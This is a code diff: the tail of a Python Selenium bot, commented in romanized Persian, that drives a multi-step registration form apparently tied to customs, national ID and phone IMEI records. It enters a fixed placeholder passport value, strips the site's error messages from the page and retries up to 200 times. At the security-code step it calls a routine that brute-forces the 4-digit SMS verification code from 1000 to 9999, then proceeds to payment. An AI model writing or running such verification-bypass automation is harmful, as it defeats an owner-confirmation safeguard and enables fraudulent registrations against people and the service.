+                                print(">>> HOSHDAR: dokme-ye tscStep click shod vali "
+                                      "safhe jelo naraft.")
+                            time.sleep(1.5)
+                            shot3 = os.path.join(_HERE, "_after_tsc.png")
+                            html3 = os.path.join(_HERE, "_after_tsc.html")
+                            try:
+                                driver.save_screenshot(shot3)
+                                with open(html3, "w", encoding="utf-8") as f:
+                                    f.write(driver.page_source)
+                                print(f">>> Ba'd az tscStep -> Screenshot: {shot3} | "
+                                      f"HTML: {html3}")
+                            except Exception:
+                                pass
+                            print(f">>> URL-e fe'li: {driver.current_url}")
+
+                            # --- MARHALE-ye 4: registrantStep — gomrok + mobile +
+                            #     gozarname (kod-e melli az ghabl por/disabled ast) + edame ---
+                            reg_sel = None
+                            for _ in range(30):  # ta ~9s sabr ta select-e gomrok biayad
+                                reg_sel = driver.execute_script(
+                                    "return !!document.querySelector('[wicketpath=\"%s\"]');"
+                                    % WP_REG_GOMROK)
+                                if reg_sel:
+                                    break
+                                time.sleep(0.3)
+
+                            if not reg_sel:
+                                print(">>> (safhe-ye registrantStep peyda nashod — "
+                                      "_after_tsc ra check kon.)")
+                            else:
+                                dbg.notify("marhale-ye 4: entekhab-e gomrok='سرو' + "
+                                           "mobile + gozarname='A'")
+                                # 1) gomrok = 'سرو' (DAGHIGH, na 'بازارچه سرو'):
+                                #    option-i ke text-ash barabar-e 'سرو' ast ra migirim.
+                                gres = driver.execute_script(r"""
+                                    var wp=arguments[0], target=arguments[1];
+                                    var sel=document.querySelector('[wicketpath="'+wp+'"]');
+                                    if(!sel) return {ok:false, reason:'no-select'};
+                                    var found=null;
+                                    for(var i=0;i<sel.options.length;i++){
+                                      if((sel.options[i].text||'').trim()===target){
+                                        found=sel.options[i]; break;
+                                      }
+                                    }
+                                    if(!found) return {ok:false, reason:'no-option'};
+                                    sel.value=found.value;
+                                    sel.dispatchEvent(new Event('input',{bubbles:true}));
+                                    sel.dispatchEvent(new Event('change',{bubbles:true}));
+                                    try{ if(window.jQuery){
+                                      var $s=jQuery(sel);
+                                      if($s.data('selectpicker')) $s.selectpicker('refresh');
+                                      $s.trigger('change'); $s.trigger('chosen:updated');
+                                    }}catch(e){}
+                                    return {ok: sel.value===found.value,
+                                            value:found.value, text:(found.text||'').trim()};
+                                """, WP_REG_GOMROK, GOMROK_NAME)
+                                print(f">>> gomrok -> {gres}")
+
+                                # 2) mobile
+                                if mobile:
+                                    try:
+                                        type_and_verify(driver, WP_REG_MOBILE, mobile)
+                                    except Exception as _me:
+                                        print(f">>> (mobile na-shod ba type_and_verify: {_me})")
+                                    mob_now = driver.execute_script(
+                                        "var e=document.querySelector('[wicketpath=\"%s\"]');"
+                                        "return e?e.value:''" % WP_REG_MOBILE)
+                                    print(f">>> mobile -> {mob_now!r}")
+                                else:
+                                    print(">>> HOSHDAR: mobile khali ast (panel-ra check kon).")
+
+                                # 3) gozarname = 'A' (sabet)
+                                try:
+                                    type_and_verify(driver, WP_REG_PASSPORT, PASSPORT_VALUE)
+                                except Exception as _pe:
+                                    print(f">>> (gozarname na-shod: {_pe})")
+                                pass_now = driver.execute_script(
+                                    "var e=document.querySelector('[wicketpath=\"%s\"]');"
+                                    "return e?e.value:''" % WP_REG_PASSPORT)
+                                nat_now = driver.execute_script(
+                                    "var e=document.querySelector('[wicketpath=\"%s\"]');"
+                                    "return e?e.value:''" % WP_REG_NATIONAL)
+                                print(f">>> VERIFY-e marhale-4 -> gomrok_ok={gres.get('ok')} "
+                                      f"mobile={mob_now if mobile else '-'!r} "
+                                      f"gozarname={pass_now!r} melli(disabled)={nat_now!r}")
+
+                                gomrok_ok = bool(gres.get("ok"))
+                                pass_ok = (pass_now or "").strip() == PASSPORT_VALUE
+                                mob_ok = (not mobile) or bool((mob_now or "").strip())
+                                if not (gomrok_ok and pass_ok and mob_ok):
+                                    print(">>> HOSHDAR: field-haye marhale-4 kamel nashod — "
+                                          "dokme-ye edame zade NEMISHAVAD. dasti check kon.")
+                                else:
+                                    # noghte-ye tasmim -> dar debug MEKAS (step)
+                                    dbg.step("click: 'edame'-ye registrantStep (marhale-4) — "
+                                             "gomrok/mobile/gozarname ra check kon")
+
+                                    # --- marhale-4: edame ta securityCodeStep ---
+                                    # MOHEM:
+                                    #  - success FAGHAT vaghti securityCodeStep biayad
+                                    #  - khata-ye movaghat (shahkar/...) : yek bar LOG
+                                    #    (matn-e jadid), sepas HEY retry ta site dorost shavad
+                                    #  - khata-ye stop (qablan sabt / yek gushi): tavaghof
+                                    #  - agar error nabud vali hanooz registrant: retry click
+                                    #    (na success-e dorughin)
+                                    REG_STOP_MARKERS = [
+                                        "قبلا",
+                                        "قبلاً",
+                                        "یک گوشی",
+                                        "یک تلفن",
+                                        "ثبت کرده",
+                                    ]
+                                    # har chizi JOZ stop = retry (shahkar, transient, ...)
+                                    REG_READ_ERR_JS = r"""
+                                        var out = {text:'', imeis:[]};
+                                        var p=document.querySelector('[wicketpath="%s"]');
+                                        if(p){
+                                          var t=(p.innerText||'').trim();
+                                          if(t) out.text = t;
+                                          p.querySelectorAll('[wicketpath$="_imei"]').forEach(
+                                            function(e){var s=(e.innerText||'').trim();
+                                              if(s) out.imeis.push(s);});
+                                        }
+                                        document.querySelectorAll(
+                                          '[wicketpath$="feedBack_container_error"] li, '+
+                                          '[wicketpath$="feedBack_container_error"] '+
+                                          'span[wicketpath$="_message"], '+
+                                          '.feedbackPanelERROR li, .feedbackPanelERROR').forEach(
+                                          function(e){var s=(e.innerText||'').trim();
+                                            if(s && out.text.indexOf(s)<0)
+                                              out.text += (out.text?' | ':'')+s;});
+                                        return out.text ? out : null;
+                                    """ % WP_REG_ERROR
+                                    REG_CLEAR_ERR_JS = r"""
+                                        var wp = arguments[0];
+                                        var p = document.querySelector('[wicketpath="'+wp+'"]');
+                                        if(p) p.innerHTML = '';
+                                        document.querySelectorAll(
+                                          '[wicketpath$="feedBack_container_error"] .feedbackPanel, '+
+                                          '[wicketpath$="feedBack_container_error"] ul, '+
+                                          '[wicketpath$="feedBack_container_error"] li').forEach(
+                                          function(e){ if(e.parentNode) e.parentNode.removeChild(e); });
+                                        return true;
+                                    """
+
+                                    def _reg_on_scs():
+                                        try:
+                                            return bool(driver.find_elements(
+                                                By.CSS_SELECTOR,
+                                                f'[wicketpath="{WP_SCS_CHECK}"]'))
+                                        except Exception:
+                                            return False
+
+                                    def _reg_still_here():
+                                        try:
+                                            return bool(driver.find_elements(
+                                                By.CSS_SELECTOR,
+                                                f'[wicketpath="{WP_REG_CONTINUE}"]'))
+                                        except Exception:
+                                            return False
+
+                                    def _reg_busy():
+                                        return driver.execute_script(r"""
+                                            var wp=arguments[0];
+                                            var b=document.querySelector('[wicketpath="'+wp+'"]');
+                                            if(b && (b.disabled ||
+                                                (' '+(b.className||'')+' ').indexOf(' disabled ')>=0))
+                                                return true;
+                                            var ind=document.querySelectorAll(
+                                              '.wicket-ajax-indicator,'+
+                                              '[wicketpath$="_indicator_indicatorImg"]');
+                                            for(var j=0;j<ind.length;j++){
+                                              if(ind[j].offsetParent!==null) return true;
+                                            }
+                                            return false;
+                                        """, WP_REG_CONTINUE)
+
+                                    def _do_reg_click():
+                                        rbtn = find(driver, WP_REG_CONTINUE)
+                                        driver.execute_script(
+                                            "arguments[0].scrollIntoView({block:'center'});", rbtn)
+                                        cc.fire_refresh_events(driver, rbtn)
+
+                                    def _read_reg_err():
+                                        try:
+                                            return driver.execute_script(REG_READ_ERR_JS)
+                                        except Exception:
+                                            return None
+
+                                    def _clear_reg_err():
+                                        try:
+                                            driver.execute_script(REG_CLEAR_ERR_JS, WP_REG_ERROR)
+                                        except Exception:
+                                            pass
+
+                                    def _wait_reg_response(timeout=25.0):
+                                        """Sabr ta AJAX tamam + (scs amad YA error amad YA
+                                        idle ba'd az click). Barmigardanad
+                                        ('scs'|'error'|'idle'|'timeout', reg_err|None)."""
+                                        t0 = time.time()
+                                        saw_busy = False
+                                        idle_since = None
+                                        while time.time() - t0 < timeout:
+                                            time.sleep(0.3)
+                                            if _reg_on_scs():
+                                                return "scs", None
+                                            err = _read_reg_err()
+                                            if err and err.get("text"):
+                                                # sabr-e kootah ta AJAX kamel matn ra bezarad
+                                                time.sleep(0.4)
+                                                err = _read_reg_err() or err
+                                                return "error", err
+                                            try:
+                                                busy = bool(_reg_busy())
+                                            except Exception:
+                                                busy = False
+                                            if busy:
+                                                saw_busy = True
+                                                idle_since = None
+                                                continue
+                                            if saw_busy:
+                                                # busy tamoom shod, hanooz scs/error nist
+                                                if not _reg_still_here():
+                                                    # dokme raft — shayad jelo raftim
+                                                    time.sleep(0.8)
+                                                    if _reg_on_scs():
+                                                        return "scs", None
+                                                    err = _read_reg_err()
+                                                    if err and err.get("text"):
+                                                        return "error", err
+                                                    return "idle", None
+                                                if idle_since is None:
+                                                    idle_since = time.time()
+                                                elif time.time() - idle_since > 1.5:
+                                                    return "idle", _read_reg_err()
+                                            else:
+                                                # hanooz busy nashode — sabr baraye shoru'-e AJAX
+                                                if time.time() - t0 > 3.0:
+                                                    # click shayad nakhord
+                                                    err = _read_reg_err()
+                                                    if err and err.get("text"):
+                                                        return "error", err
+                                                    if _reg_on_scs():
+                                                        return "scs", None
+                                                    return "idle", None
+                                        if _reg_on_scs():
+                                            return "scs", None
+                                        err = _read_reg_err()
+                                        if err and err.get("text"):
+                                            return "error", err
+                                        return "timeout", None
+
+                                    # loop-e asl: ta scs ya stop
+                                    MAX_REG_RETRY = 200  # ~saat-ha agar delay bashe; stop ba marker
+                                    last_logged_err = None
+                                    reg_advanced = False
+                                    reg_stopped = False
+                                    for rt in range(1, MAX_REG_RETRY + 1):
+                                        if _reg_on_scs():
+                                            reg_advanced = True
+                                            break
+                                        if not _reg_still_here():
+                                            time.sleep(1.0)
+                                            if _reg_on_scs():
+                                                reg_advanced = True
+                                                break
+                                            # safhe avaz shode vali scs nist — dump + retry
+                                            print(">>> (marhale-4: dokme-ye reg nist, scs ham nist "
+                                                  "— montazer/retry)")
+
+                                        print(f">>> marhale-4: click-e 'edame' "
+                                              f"(talash {rt}/{MAX_REG_RETRY}) ...")
+                                        _clear_reg_err()
+                                        try:
+                                            _do_reg_click()
+                                        except Exception as _rce:
+                                            print(f">>> khata dar click-e reg: {_rce}")
+                                            time.sleep(2.0)
+                                            continue
+
+                                        status, reg_err = _wait_reg_response(timeout=25.0)
+                                        print(f">>> marhale-4 pasokh: status={status}")
+
+                                        if status == "scs" or _reg_on_scs():
+                                            reg_advanced = True
+                                            break
+
+                                        etext = ""
+                                        err_imeis = []
+                                        if reg_err and reg_err.get("text"):
+                                            etext = (reg_err.get("text") or "").strip()
+                                            err_imeis = reg_err.get("imeis") or []
+                                        err_serial = (",".join(err_imeis)
+                                                      if err_imeis else imei)
+
+                                        if etext:
+                                            is_stop = any(m in etext for m in REG_STOP_MARKERS)
+                                            # matn-e JADID ra yek bar log kon (tekrari na)
+                                            if etext != last_logged_err:
+                                                last_logged_err = etext
+                                                log_event(
+                                                    "error" if is_stop else "warn",
+                                                    etext if is_stop else (
+                                                        f"khata-ye movaghat (retry): {etext}"),
+                                                    step="marhale-4/registrantStep",
+                                                    title=title, national=national,
+                                                    imei=err_serial)
+                                                print(">>> KHATA-ye marhale-4 "
+                                                      f"({'STOP' if is_stop else 'retry'}):")
+                                                print("     " + etext.encode(
+                                                    "unicode_escape").decode("ascii"))
+                                            else:
+                                                print(">>> (hamun khata — dobare retry, "
+                                                      "bedun-e log-e tekrari)")
+
+                                            if is_stop:
+                                                reg_stopped = True
+                                                print(">>> ⛔ KHATA-ye STOP marhale-4 — "
+                                                      "ba in moshakhasat nemitavan edame dad.")
+                                                break
+
+                                            # movaghat / digar: sabr + retry
+                                            time.sleep(2.5)
+                                            continue
+
+                                        # error nist, scs nist -> click bi-asarbud ya slow
+                                        print(">>> marhale-4: hanooz registrant (bedun-e "
+                                              "error-e khanda-shode) — retry ...")
+                                        time.sleep(2.0)
+
+                                    # dump-e nahayi
+                                    shot4 = os.path.join(_HERE, "_after_reg.png")
+                                    html4 = os.path.join(_HERE, "_after_reg.html")
+                                    try:
+                                        driver.save_screenshot(shot4)
+                                        with open(html4, "w", encoding="utf-8") as f:
+                                            f.write(driver.page_source)
+                                        print(f">>> Ba'd az registrantStep -> Screenshot: "
+                                              f"{shot4} | HTML: {html4}")
+                                    except Exception:
+                                        pass
+                                    print(f">>> URL-e fe'li: {driver.current_url}")
+
+                                    if reg_stopped:
+                                        print(">>> Panjere baz mimanad; Enter bezan ta baste shavad.")
+                                        try:
+                                            input()
+                                        except EOFError:
+                                            time.sleep(300)
+                                        return
+
+                                    if not reg_advanced and not _reg_on_scs():
+                                        log_event(
+                                            "error",
+                                            f"marhale-4 ba'd az {MAX_REG_RETRY} talash "
+                                            f"be securityCodeStep naresid "
+                                            f"(akharin khata: {last_logged_err or 'n/a'})",
+                                            step="marhale-4/registrantStep",
+                                            title=title, national=national, imei=imei)
+                                        print(">>> ⛔ marhale-4 pish naraft — scs nayamad. "
+                                              "ROBOT motevaghef (panjere baz).")
+                                        print(">>> Panjere baz mimanad; Enter bezan ta baste shavad.")
+                                        try:
+                                            input()
+                                        except EOFError:
+                                            time.sleep(300)
+                                        return
+
+                                    # inja HATMAN scs amade (ya advanced)
+                                    log_event("success",
+                                              "marhale-4 bedun-e khata rad shod "
+                                              "(resid be securityCodeStep)",
+                                              step="marhale-4/registrantStep",
+                                              title=title, national=national,
+                                              imei=imei)
+
+                                    # --- MARHALE-ye 5: securityCodeStep ---
+                                    # kod-e 4-raqami-ye SMS-ra NEMIDANIM ->
+                                    # BRUTE-FORCE-e 1000..9999.
+                                    if driver.find_elements(
+                                            By.CSS_SELECTOR,
+                                            f'[wicketpath="{WP_SCS_CHECK}"]'):
+                                        found = brute_force_security_code(
+                                            driver, dbg=dbg, title=title,
+                                            national=national, imei=imei)
+                                        shot5 = os.path.join(_HERE, "_after_security.png")
+                                        html5 = os.path.join(_HERE, "_after_security.html")
+                                        try:
+                                            driver.save_screenshot(shot5)
+                                            with open(html5, "w", encoding="utf-8") as f:
+                                                f.write(driver.page_source)
+                                            print(f">>> Ba'd az securityCodeStep -> "
+                                                  f"Screenshot: {shot5} | HTML: {html5}")
+                                        except Exception:
+                                            pass
+                                        if found:
+                                            print(f">>> ✅ KOD = {found}. handle_receipt_and_payment ...")
+                                            try:
+                                                handle_receipt_and_payment(
+                                                    driver, title=title,
+                                                    national=national, imei=imei)
+                                            except Exception as _hpe:
+                                                print(f">>> (handle_receipt_and_payment khata: {_hpe})")
+                                        else:
+                                            print(">>> ⚠ kod peyda nashod — "
+                                                  "panjere baz mimanad ta check koni.")
+                                    else:
+                                        print(">>> (securityCodeStep nayamad — "
+                                              "_after_reg-ra check kon.)")
+            else:
+                print(">>> (safhe-ye hamtaStep peyda nashod — ehtemalan khata ya "
+                      "safhe-ye digar. HTML/screenshot-ra check kon.)")
+
+            print(">>> Panjere baz mimanad; Enter bezan ta baste shavad.")
+            try:
+                input()
+            except EOFError:
+                time.sleep(300)
+            break  # kar tamam shod
+
+        except Exception as e:
+            msg = str(e).splitlines()[0] if str(e) else type(e).__name__
+            print(f">>> [talash {attempt}] khata: {msg}")
+            if attempt >= MAX_TRY:
+                log_event("error", f"crash/na-movaffagh: {msg}",
+                          step=f"talash-{attempt}", title=title,
+                          national=national, imei=imei)
+            try:
+                if driver:
+                    driver.quit()
+                    print(">>> (morurgar-e talash-e ghabli baste shod.)")
+            except Exception:
+                pass
+            driver = None
+            if attempt < MAX_TRY:
+                # restart-e sari': qablan 3s bood — site aghlab ba get-e dobare zood miad
+                delay = 0.8 if attempt < 5 else 1.5
+                print(f">>> Restart-e sari'-e morurgar ({delay}s) va talash-e dobare ...")
+                time.sleep(delay)
+            else:
+                print(">>> Hame-ye talash-ha na-movaffagh bood. Shabake/site pasokh nemidahad.")
+        finally:
+            pass
+
+    try:
+        if driver:
+            driver.quit()
+    except Exception:
+        pass
+
+
+if __name__ == "__main__":
+    main()
